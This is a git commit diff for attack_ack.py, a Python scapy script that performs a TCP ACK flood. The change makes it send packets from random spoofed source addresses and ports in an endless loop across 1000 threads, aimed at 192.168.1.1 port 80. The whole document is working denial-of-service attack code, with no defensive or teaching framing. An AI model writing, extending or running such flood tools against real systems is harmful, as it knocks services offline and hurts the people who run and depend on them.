5c1d02948284b114ec6a53d0898be8c49550ee57
Nomads Developer <57294366+nomadsdev@users.noreply.github.com>
2024-09-05 03:36:22 +0700

    ack up

--- attack_ack.py
+++ attack_ack.py
@@ -1,17 +1,27 @@
 from scapy.all import IP, TCP, RandIP, RandShort, send
+import threading
 
 target_ip = "192.168.1.1"
 target_port = 80
 
-def ack_flood(target_ip, target_port):
-    src_ip = RandIP()
-    src_port = RandShort()
-
+def ack_flood_worker(target_ip, target_port):
     while True:
+        src_ip = RandIP()
+        src_port = RandShort()
         ip = IP(src=src_ip, dst=target_ip)
         tcp = TCP(sport=src_port, dport=target_port, flags="A")
         packet = ip/tcp
 
         send(packet, verbose=False)
 
-ack_flood(target_ip, target_port)
+def ack_flood(target_ip, target_port, num_threads=10):
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=ack_flood_worker, args=(target_ip, target_port))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+ack_flood(target_ip, target_port, num_threads=1000)
